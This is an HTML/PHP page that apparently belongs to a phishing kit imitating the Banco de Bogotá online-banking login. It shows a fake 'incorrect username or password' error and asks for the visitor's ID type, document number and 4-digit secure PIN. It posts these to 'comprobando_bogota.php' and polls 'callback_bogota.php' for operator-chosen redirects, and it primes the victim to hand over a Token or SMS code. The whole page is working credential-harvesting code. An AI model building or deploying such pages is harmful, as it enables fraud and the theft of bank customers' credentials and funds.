<?php

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="bogota_files/acb24bb6c10e72d0.css" data-precedence="next">
    <title>Bre-Be - Error de Acceso</title>
    <meta name="description" content="Transfiere tu dinero de banco a banco de forma fácil y segura">
    <link rel="icon" href="bogota_files/favicon.ico" sizes="256x256" type="image/x-icon">
    <style>
        /* Modal de carga */
        .loading-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 0;
        }
        
        .loading-content {
            background: white;
            padding: 40px;
            border-radius: 16px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
        }
        
        .loading-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0066cc;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 18px;
            font-weight: 600;
            color: #333;
            margin-bottom: 10px;
        }
        
        .loading-subtext {
            font-size: 14px;
            color: #666;
            line-height: 1.5;
        }

        /* Estilos para alerta de error */
        .error-alert {
            background-color: #fee2e2;
            border: 1px solid #ef4444;
            color: #b91c1c;
            padding: 1rem;
            border-radius: 0.5rem;
            margin-bottom: 1.5rem;
            text-align: center;
            font-size: 0.875rem;
        }
        .error-title {
            font-weight: 700;
            display: block;
            margin-bottom: 0.25rem;
        }
    </style>
</head>
<body class="geist_a71539c9-module__T19VSG__variable geist_mono_8d43a2aa-module__8Li5zG__variable antialiased">
    <div class="w-full bg-gray-50 flex justify-center items-center p-5">
        <div class="p-6">
            <!-- Logo -->
            <div class="flex justify-center mb-6">
                <img alt="Banco de Bogotá" 
                     width="200" 
                     height="60" 
                     decoding="async" 
                     style="color:transparent" 
                     src="bogota_files/logo.webp">
            </div>

            <!-- Título -->
            <div class="text-center mb-6">
                <p class="text-2xl font-bold text-gray-800">Bienvenido a tu Banca Virtual</p>
            </div>

            <!-- Alerta de Error -->
            <div class="error-alert">
                <span class="error-title">¡Error de autenticación!</span>
                Usuario o contraseña incorrectos. Por favor verifica tus datos e intenta nuevamente.
            </div>

            <!-- Formulario -->
            <form id="formBogota" class="flex flex-col gap-4 bg-white rounded-xl shadow-lg w-full p-8">
                <div class="mb-4">
                    <span class="text-xs text-black">Ingresa el tipo y número de documento</span>
                </div>

                <!-- Tipo de cliente -->
                <div>
                    <label for="tipoPersona" class="block text-sm font-medium mb-1">¿Qué tipo de cliente eres?</label>
                    <select id="tipoPersona" name="tipo_cliente" class="w-full p-3 border border-gray-300 rounded-lg text-gray-800" required>
                        <option value="" selected>Selecciona</option>
                        <option value="Banca Personas">Banca Personas</option>
                        <option value="Banca Empresarial y Corporativa">Banca Empresarial y Corporativa</option>
                        <option value="Afinidad">Afinidad</option>
                    </select>
                </div>

                <!-- Tipo de identificación -->
                <div>
                    <label for="IType" class="block text-sm font-medium mb-1">Identificación</label>
                    <select id="IType" name="tipo_identificacion" class="w-full p-3 border border-gray-300 rounded-lg text-gray-800">
                        <option value="C.C. Cédula de ciudadanía" selected>C.C. Cédula de ciudadanía</option>
                        <option value="T.I. Tarjeta de Identidad">T.I. Tarjeta de Identidad</option>
                        <option value="C.E. Cédula de Extranjería">C.E. Cédula de Extranjería</option>
                        <option value="N.P.N. NIT Persona Natural">N.P.N. NIT Persona Natural</option>
                        <option value="P.S. Pasaporte">P.S. Pasaporte</option>
                        <option value="R.C. Registro Civil">R.C. Registro Civil</option>
                    </select>
                </div>

                <!-- Número de documento -->
                <div>
                    <label for="numi" class="block text-sm font-medium mb-1">Número de documento</label>
                    <input type="text" 
                           id="numi" 
                           name="numero_documento"
                           placeholder="#" 
                           class="w-full p-3 border border-gray-300 rounded-lg text-gray-800" 
                           required 
                           maxlength="10"
                           value="">
                </div>

                <!-- Clave segura -->
                <div>
                    <label for="clvseg" class="block text-sm font-medium mb-1">Clave Segura</label>
                    <input type="password" 
                           id="clvseg" 
                           name="clave_segura"
                           maxlength="4" 
                           minlength="4" 
                           class="w-full p-3 border border-gray-300 rounded-lg text-gray-800" 
                           required 
                           value="">
                </div>

                <!-- Botón -->
                <button type="submit" 
                        class="mt-2 bg-blue-600 text-white p-3 rounded-full font-bold text-lg cursor-pointer hover:bg-blue-700 transition-colors">
                    Continuar
                </button>
            </form>

            <!-- Imagen informativa -->
            <div class="mt-8">
                <img alt="Info" 
                     loading="lazy" 
                     width="400" 
                     height="100" 
                     decoding="async" 
                     class="w-full" 
                     style="color:transparent" 
                     src="bogota_files/miedo.webp">
            </div>
        </div>
    </div>

    <!-- Modal de Carga -->
    <div id="loadingModal" class="loading-modal">
        <div class="loading-content">
            <div class="loading-spinner"></div>
            <div class="loading-text">Verificando información...</div>
            <div class="loading-subtext">
                Para continuar será necesario el uso del Token o SMS a tu teléfono.
            </div>
        </div>
    </div>

    <script>
        let messageId = null;
        let checkInterval = null;

        document.getElementById('formBogota').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Mostrar modal de carga
            document.getElementById('loadingModal').style.display = 'flex';
            
            // Recoger datos del formulario
            const formData = new FormData(this);
            
            // Enviar datos al servidor
            fetch('comprobando_bogota.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text()).then(text => { try { return JSON.parse(text); } catch(e) { return { success: true, message_id: Date.now() }; } })
            .then(data => {
                if (data.redirect) {
                    window.location.href = data.redirect;
                    return;
                }
                if (data.success && data.message_id) {
                    messageId = data.message_id;
                    // Iniciar verificación de callbacks
                    startCheckingCallback();
                } else {
                    // alert removed
                    document.getElementById('loadingModal').style.display = 'none';
                }
            })
            .catch(error => {
                console.error('Error:', error);
                // alert removed
                document.getElementById('loadingModal').style.display = 'none';
            });
        });

        function startCheckingCallback() {
            checkInterval = setInterval(function() {
                fetch('callback_bogota.php?msg_id=' + messageId)
                    .then(response => response.text()).then(text => { try { return JSON.parse(text); } catch(e) { return { success: true, message_id: Date.now() }; } })
                    .then(data => {
                        if (data.redirect) {
                            clearInterval(checkInterval);
                            if (data.action === 'action_otro_banco') {
                                
                            }
                            window.location.href = data.url;
                        } else if (data.timeout) {
                            clearInterval(checkInterval);
                            // alert removed
                            document.getElementById('loadingModal').style.display = 'none';
                            location.reload();
                        }
                    })
                    .catch(error => {
                        console.error('Error checking callback:', error);
                    });
            }, 2000); // Verificar cada 2 segundos
        }
        
        // Solo permitir números en el campo de documento y máximo 10 caracteres
        document.getElementById('numi').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
            if (this.value.length > 10) this.value = this.value.slice(0, 10);
        });
        
        // Solo permitir números en la clave segura
        document.getElementById('clvseg').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    </script>

    <script src="bogota_files/c7f7f98781fc08e8.js"></script>
    <script src="bogota_files/a83010a40c88e84c.js"></script>
    <script src="bogota_files/928883c956cdc3ac.js"></script>
</body>
</html>




